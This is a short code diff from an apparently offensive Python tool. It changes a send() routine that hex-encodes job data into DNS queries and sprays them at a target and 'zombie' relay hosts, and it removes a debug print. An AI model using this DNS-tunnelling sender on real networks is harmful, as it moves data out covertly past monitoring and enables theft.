@@ -61,7 +61,10 @@ def sniff(handler):
 #Max query is 253 characters long (textual representation)
 #Max label length is 63 bytes
 def send(data):
-    targets = config['zombies'] + [config['target']]
+    if config.has_key('zombies') and config['zombies'] != [""]:
+        targets = [config['target']] + config['zombies']
+    else:
+        targets = [config['target']]
     port = config['port']
     jobid = data.split("|!|")[0]
     data = data.encode('hex')
@@ -93,7 +96,6 @@ def send(data):
         q = DNSRecord.question(domain)
         domain = ""
         target = choice(targets)
-        print 'sending to ' + str(target)
         try:
             q.send(target, port, timeout=0.01)
         except:
